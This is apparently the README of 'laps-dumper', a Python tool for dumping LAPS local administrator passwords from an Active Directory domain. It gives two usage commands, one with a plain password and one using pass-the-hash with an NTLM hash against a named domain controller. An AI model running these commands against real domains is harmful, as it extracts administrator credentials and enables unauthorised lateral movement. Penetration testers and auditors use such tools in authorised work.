# laps-dumper

## Description

Dumping LAPS passwords from Python.

## Usage

```shell
python laps-dumper.py -u user -p password -d domain.local
```

Pass the Hash, specific LDAP server:

```shell
python laps.py -u user -p 304106f739822ea2ad8ebe23f802d078:8126756fb2e69697bfcb04816e685839 -d domain.local -l dc01.domain.local
```